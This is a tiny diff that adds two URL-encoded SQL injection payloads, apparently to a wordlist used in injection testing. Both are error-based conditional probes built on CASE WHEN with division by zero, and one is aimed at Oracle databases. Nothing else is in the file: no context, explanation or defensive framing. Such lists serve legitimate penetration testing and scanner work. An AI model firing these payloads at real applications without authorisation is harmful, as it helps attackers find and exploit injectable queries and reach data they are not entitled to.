@@ -1,0 +1,4 @@
+
+'+and+(select+case+when+(1=2)+then+1/0+else+'1'+end)='1
+'+and+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)--
+
